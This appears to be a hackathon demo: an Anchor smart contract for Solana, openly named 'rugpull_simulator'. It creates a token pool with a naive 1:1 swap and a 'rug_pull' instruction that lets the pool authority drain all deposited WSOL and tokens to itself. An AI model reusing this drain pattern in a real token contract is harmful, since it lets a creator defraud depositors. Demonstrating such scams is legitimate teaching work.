use anchor_lang::prelude::*;
use anchor_spl::token::{self, Mint, Token, TokenAccount, Transfer};

declare_id!("Fa6XiYSXtmJPxnrhrjjSbwQgMKASBh752YcCvrvpEAcs");

#[program]
pub mod rugpull_simulator {
    use super::*;

    pub fn initialize_pool(ctx: Context<InitializePool>) -> Result<()> {
        let pool = &mut ctx.accounts.pool;

        pool.scam_vault = ctx.accounts.scam_vault.key();
        pool.sol_vault = ctx.accounts.sol_vault.key();
        pool.scam_mint = ctx.accounts.scam_mint.key();
        pool.wsol_mint = ctx.accounts.wsol_mint.key();
        pool.authority = ctx.accounts.initializer.key();

        Ok(())
    }

    pub fn swap(ctx: Context<Swap>, is_buy: bool, amount_in: u64) -> Result<()> {
        let pool = &ctx.accounts.pool;

        if is_buy {
            // User provides WSOL → receives scam tokens
            let sol_vault = &ctx.accounts.sol_vault;
            let scam_vault = &ctx.accounts.scam_vault;

            // Transfer WSOL from user → sol_vault
            token::transfer(
                CpiContext::new(
                    ctx.accounts.token_program.to_account_info(),
                    Transfer {
                        from: ctx.accounts.user_sol_ata.to_account_info(),
                        to: sol_vault.to_account_info(),
                        authority: ctx.accounts.user.to_account_info(),
                    },
                ),
                amount_in,
            )?;

            // Simple ratio-based output (not full x*y=k swap)
            // For hackathon, just proportional
            let scam_out = amount_in; // 1:1 for demo

            // Transfer scam tokens from vault → user
            token::transfer(
                CpiContext::new(
                    ctx.accounts.token_program.to_account_info(),
                    Transfer {
                        from: scam_vault.to_account_info(),
                        to: ctx.accounts.user_scam_ata.to_account_info(),
                        authority: ctx.accounts.pool.to_account_info(),
                    },
                )
                .with_signer(&[&[b"pool", &[ctx.bumps.pool]]]),
                scam_out,
            )?;
        } else {
            // User provides scam tokens → receives WSOL
            let sol_vault = &ctx.accounts.sol_vault;
            let scam_vault = &ctx.accounts.scam_vault;

            // Transfer scam tokens from user → scam_vault
            token::transfer(
                CpiContext::new(
                    ctx.accounts.token_program.to_account_info(),
                    Transfer {
                        from: ctx.accounts.user_scam_ata.to_account_info(),
                        to: scam_vault.to_account_info(),
                        authority: ctx.accounts.user.to_account_info(),
                    },
                ),
                amount_in,
            )?;

            // For demo, 1:1
            let sol_out = amount_in;

            // Transfer WSOL from vault → user
            token::transfer(
                CpiContext::new(
                    ctx.accounts.token_program.to_account_info(),
                    Transfer {
                        from: sol_vault.to_account_info(),
                        to: ctx.accounts.user_sol_ata.to_account_info(),
                        authority: ctx.accounts.pool.to_account_info(),
                    },
                )
                .with_signer(&[&[b"pool", &[ctx.bumps.pool]]]),
                sol_out,
            )?;
        }

        Ok(())
    }

    pub fn rug_pull(ctx: Context<RugPull>) -> Result<()> {
        let pool = &ctx.accounts.pool;

        require_keys_eq!(pool.authority, ctx.accounts.authority.key(), CustomError::Unauthorized);

        // Drain scam tokens
        let scam_balance = ctx.accounts.scam_vault.amount;
        if scam_balance > 0 {
            token::transfer(
                CpiContext::new(
                    ctx.accounts.token_program.to_account_info(),
                    Transfer {
                        from: ctx.accounts.scam_vault.to_account_info(),
                        to: ctx.accounts.authority_scam_ata.to_account_info(),
                        authority: ctx.accounts.pool.to_account_info(),
                    },
                )
                .with_signer(&[&[b"pool", &[ctx.bumps.pool]]]),
                scam_balance,
            )?;
        }

        // Drain SOL (WSOL)
        let sol_balance = ctx.accounts.sol_vault.amount;
        if sol_balance > 0 {
            token::transfer(
                CpiContext::new(
                    ctx.accounts.token_program.to_account_info(),
                    Transfer {
                        from: ctx.accounts.sol_vault.to_account_info(),
                        to: ctx.accounts.authority_sol_ata.to_account_info(),
                        authority: ctx.accounts.pool.to_account_info(),
                    },
                )
                .with_signer(&[&[b"pool", &[ctx.bumps.pool]]]),
                sol_balance,
            )?;
        }

        Ok(())
    }
}

// -------------------------------- Accounts ---------------------------------

#[derive(Accounts)]
pub struct InitializePool<'info> {
    #[account(
        init,
        payer = initializer,
        space = 8 + 32*5,
        seeds = [b"pool"],
        bump
    )]
    pub pool: Account<'info, PoolState>,

    #[account(
        init,
        token::mint = scam_mint,
        token::authority = pool,
        payer = initializer
    )]
    pub scam_vault: Account<'info, TokenAccount>,

    #[account(
        init,
        token::mint = wsol_mint,
        token::authority = pool,
        payer = initializer
    )]
    pub sol_vault: Account<'info, TokenAccount>,

    pub scam_mint: Account<'info, Mint>,
    pub wsol_mint: Account<'info, Mint>,

    #[account(mut)]
    pub initializer: Signer<'info>,
    pub system_program: Program<'info, System>,
    pub token_program: Program<'info, Token>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct Swap<'info> {
    #[account(mut, seeds = [b"pool"], bump)]
    pub pool: Account<'info, PoolState>,

    #[account(mut)]
    pub scam_vault: Account<'info, TokenAccount>,
    #[account(mut)]
    pub sol_vault: Account<'info, TokenAccount>,

    #[account(mut)]
    pub user_scam_ata: Account<'info, TokenAccount>,
    #[account(mut)]
    pub user_sol_ata: Account<'info, TokenAccount>,

    #[account(mut)]
    pub user: Signer<'info>,

    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct RugPull<'info> {
    #[account(mut, seeds = [b"pool"], bump)]
    pub pool: Account<'info, PoolState>,

    #[account(mut)]
    pub scam_vault: Account<'info, TokenAccount>,
    #[account(mut)]
    pub sol_vault: Account<'info, TokenAccount>,

    #[account(mut)]
    pub authority_scam_ata: Account<'info, TokenAccount>,
    #[account(mut)]
    pub authority_sol_ata: Account<'info, TokenAccount>,

    pub authority: Signer<'info>,
    pub token_program: Program<'info, Token>,
}

#[account]
pub struct PoolState {
    pub scam_vault: Pubkey,
    pub sol_vault: Pubkey,
    pub scam_mint: Pubkey,
    pub wsol_mint: Pubkey,
    pub authority: Pubkey,
}

#[error_code]
pub enum CustomError {
    #[msg("Unauthorized action.")]
    Unauthorized,
}